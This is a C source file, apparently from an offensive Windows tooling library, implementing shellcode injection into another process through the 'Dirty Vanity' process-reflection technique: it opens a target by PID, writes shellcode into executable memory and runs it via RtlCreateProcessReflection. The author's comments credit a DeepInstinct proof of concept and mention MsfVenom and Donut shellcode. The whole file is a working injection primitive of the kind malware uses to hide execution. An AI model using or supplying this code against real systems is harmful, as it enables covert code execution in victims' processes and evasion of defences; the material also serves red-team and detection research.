#include "Win32Helper.h"

BOOL MpfProcessInjectionViaProcessReflection(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid)
{
	/*
		This process execution is really finnicky. I was able to get this to work
		using the proof-of-concept dubbed "DirtyVanity".

		Link: https://github.com/deepinstinct/Dirty-Vanity

		However, I was unable to get this to work using traditional shellcode (or PIC binaries)
		from projects such as Donut of MsfVenom. I am too lazy to modify the Shellcode supplied
		from DeepInstinct.

		tl;dr code works, too lazy to debug to determine more accurate shellcode requirements

		/me shrugs
	
	*/

	RTLCREATEPROCESSREFLECTION RtlCreateProcessReflection = NULL;
	HMODULE hModule = NULL;
	BOOL bFlag = FALSE;
	HANDLE hHandle = NULL;
	LPVOID BaseAddress = NULL;
	SIZE_T DisposableObject = ERROR_SUCCESS;
	RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION Information = { 0 };

	hModule = GetModuleHandleEx2W(L"ntdll.dll");
	if (hModule == NULL)
		goto EXIT_ROUTINE;

	RtlCreateProcessReflection = (RTLCREATEPROCESSREFLECTION)GetProcAddressA((DWORD64)hModule, "RtlCreateProcessReflection");
	if (!RtlCreateProcessReflection)
		goto EXIT_ROUTINE;

	hHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, TargetPid);
	if (hHandle == NULL)
		goto EXIT_ROUTINE;

	BaseAddress = VirtualAllocEx(hHandle, NULL, dwSizeOfShellcodeInBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (BaseAddress == NULL)
		goto EXIT_ROUTINE;

	if (!WriteProcessMemory(hHandle, BaseAddress, Shellcode, dwSizeOfShellcodeInBytes, &DisposableObject))
		goto EXIT_ROUTINE;

	if (RtlCreateProcessReflection(hHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, BaseAddress, NULL, NULL, &Information) != STATUS_SUCCESS)
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hHandle)
		CloseHandle(hHandle);

	return bFlag;
}